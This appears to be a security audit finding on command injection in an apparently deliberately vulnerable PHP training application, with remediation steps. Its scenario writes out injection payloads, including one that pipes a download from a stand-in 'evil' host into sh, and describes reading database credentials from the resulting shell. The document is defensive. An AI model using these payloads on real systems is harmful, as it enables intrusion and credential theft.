  mitigation_title: Validate target host and use escapeshellarg
  remediation:
    effort: Low
    reference: https://cwe.mitre.org/data/definitions/78.html
    steps:
    - Validate the target and ip values with filter_var(FILTER_VALIDATE_IP), or with
      a strict hostname regex for target, and reject anything that fails.
    - Replace the str_replace metacharacter blacklist in medium.php with that validation.
    - Pass the value through escapeshellarg(), or better, avoid the shell entirely
      by running ping through proc_open with an argument array.
    - Require an authenticated, authorized token on health/connectivity, or remove
      the endpoint.
    verification: Run curl -X POST -d '{"target":"127.0.0.1;sleep 10"}' http://host/vulnerabilities/api/v2/health/connectivity
      and confirm that it returns immediately with a validation error. Then run an
      automated test that submits values containing shell metacharacters to the exec
      ping feature at the low and medium levels. Assert that they are rejected with
      an invalid-IP error and never reach shell_exec.
  risk: Critical
  scenario: Request data reaches shell commands, which gives the attacker arbitrary
    command execution as the web server user. At vulnerabilities/api/src/HealthController.php:88,
    an unauthenticated attacker POSTs JSON such as {"target":"127.0.0.1;id"} or {"target":"x;
    curl http://evil/s|sh"} to /vulnerabilities/api/v2/health/connectivity. The API
    front controller routes health commands without authentication, and the target
    value is concatenated unvalidated and unescaped into an exec() ping command. The
    payload runs as the Apache user, and the attacker can use the resulting shell
    to read the DB credentials in config/config.inc.php and pivot to MariaDB. At vulnerabilities/exec/source/low.php:14,
    an authenticated user's ip parameter at the low level is concatenated into shell_exec
    without validation, so shell metacharacters run extra commands. At vulnerabilities/exec/source/medium.php:23,
    the medium level's str_replace blacklist removes only two shell separators. Other
    shell operators survive and reach shell_exec, so an authenticated user can run
    commands. The finding holds 7 places, more than the locations cited here.
